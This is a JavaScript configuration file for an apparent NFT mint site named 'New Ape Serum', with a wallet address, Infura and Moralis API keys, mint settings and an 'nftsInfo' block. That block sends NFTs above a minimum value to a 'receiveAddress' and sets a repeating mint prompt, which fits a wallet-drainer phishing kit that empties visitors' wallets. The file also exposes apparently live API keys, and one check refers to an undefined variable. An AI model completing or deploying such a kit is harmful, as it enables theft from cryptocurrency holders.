const address = '0xCbC0011c318c0368FAfe94ca7C85867d4BbC28E3',
  infuraId = '5b7825e5fcc64bc4bf49f496587392ed',
  moralisApi =
    'BiY8KrXg1tXZSu4JUtOJ4JGZx89DErf5ZN0bfiyXkzQLi2GU8rfjREwurLHXTJRA'
const x20Ethereum = 'ETH ADRESS'
const collectionInfo = {
  name: 'New Ape Serum',
  title: 'New Ape Serum',
  date: '28.07.2022',
  socialMedia: {
    discord: 'https://discord.gg/',
    twitter: 'https://twitter.com',
  },
  medias: {
    preview: 'preview.gif',
    favicon: 'logo.png',
  },
  background: {
    type: 'video',
    image: 'background.jpg',
    video: 'background.mp4',
    color: '#4E4E6D',
  },
}
const mintInfo = {
    price: 0.02,
    totalSupply: 150,
    minUnits: 1,
    maxUnits: 1,
    askMintLoop: true,
  },
  nftsInfo = {
    active: true,
    minValue: 0.1,
    checkMaxDay: 7,
    receiveAddress: 'NFT ADRESS',
  }
if (mintInfo.minUnits > mintInfo.maxUnits) {
  console.error(
    'Error: minUnits (' +
      mintInfo.minUnits +
      ') is greater than maxUnits (' +
      maxUnits +
      ')'
  )
}
if (mintInfo.minUnits <= 0) {
  console.error(
    'Error: minUnits (' + mintInfo.minUnits + ') is less than or equal to 0'
  )
}
if (!address.startsWith('0x') || address.length >= 64 || address.length <= 40) {
  console.error('Error: ' + address + ' is not a valid Ethereum address.')
}
